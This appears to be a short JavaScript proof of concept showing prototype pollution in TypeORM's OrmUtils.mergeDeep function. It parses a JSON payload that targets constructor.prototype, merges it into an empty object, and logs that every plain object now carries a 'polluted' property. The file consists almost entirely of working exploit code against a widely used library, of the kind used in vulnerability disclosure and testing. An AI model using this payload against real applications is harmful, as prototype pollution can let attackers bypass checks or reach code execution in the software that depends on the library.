var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
var typeorm = require('typeorm/util/OrmUtils');
const a = {};
const b = JSON.parse(`{"constructor": {"prototype": {"polluted":"yes"}}}`);
console.log({}.polluted);
typeorm.OrmUtils.mergeDeep(a, b);
console.log({}.polluted);